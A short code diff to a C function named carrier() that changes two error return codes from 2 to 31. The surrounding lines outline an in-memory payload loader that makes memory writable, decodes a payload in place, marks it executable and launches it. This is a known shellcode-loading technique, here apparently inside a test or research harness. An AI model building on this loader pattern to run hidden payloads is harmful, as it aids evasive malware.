@@ -13,7 +13,7 @@ int carrier() {
 
     // 1. Make RW
     if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RW, &result)) {
-        return 2;
+        return 31;
     }
 
     // 2. Decode (In-Place)
@@ -21,7 +21,7 @@ int carrier() {
 
     // 3. Make RX
     if (!MyVirtualProtect(dest, PAYLOAD_LEN, p_RX, &result)) {
-        return 2;
+        return 31;
     }
 
     ARTIFACT_CHECKPOINT("Launching");
